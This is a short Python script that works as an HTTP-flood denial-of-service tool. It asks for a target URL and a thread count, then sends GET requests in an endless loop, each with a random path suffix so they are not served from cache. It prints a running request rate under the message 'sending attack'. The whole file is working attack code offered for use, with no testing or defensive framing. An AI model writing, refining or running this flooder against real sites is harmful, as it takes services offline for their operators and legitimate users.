import requests
import random
import string
import concurrent.futures
import os
import threading
import time

class everywhere:
    chars = urls = []
    threads = sent = 0
    seconds = 1

def suffix():
    sfx =  "".join(random.choice(everywhere.chars) for x in range(random.randint(1, 50)))
    return sfx

def send(url):
    if url[-1] == "/":
        rq = url+suffix()
    else:
        rq = url+"/"+suffix()
    try:
        requests.get(rq, timeout=1)
        everywhere.sent += 1
    except:
        pass

def start():
    with concurrent.futures.ThreadPoolExecutor(max_workers=everywhere.threads) as executor:
        for value in executor.map(send, everywhere.urls):
            pass

def disp():
    while True:
        os.system("cls")
        print(f"requests sent: {everywhere.sent}\nrequests per second: {everywhere.sent/everywhere.seconds}")
        time.sleep(2)
        everywhere.seconds += 2


if __name__ == "__main__":
    everywhere.chars = string.ascii_lowercase + string.digits
    while True:
        os.system("cls")
        url = input("enter the url\n>>")
        if "http" in url:
            if "://" in url.split("http")[1]:
                break

    while True:
        os.system("cls")
        try:
            everywhere.threads = int(input("enter the thread count\n>>"))
            break
        except:
            os.system("cls")
    os.system("cls")
    print("loading threads...")
    for x in range(1000):
        everywhere.urls.append(url)
    print(f"sending attack with {everywhere.threads} threads to {url}")
    threading.Thread(target=disp).start()
    while True:
        start()
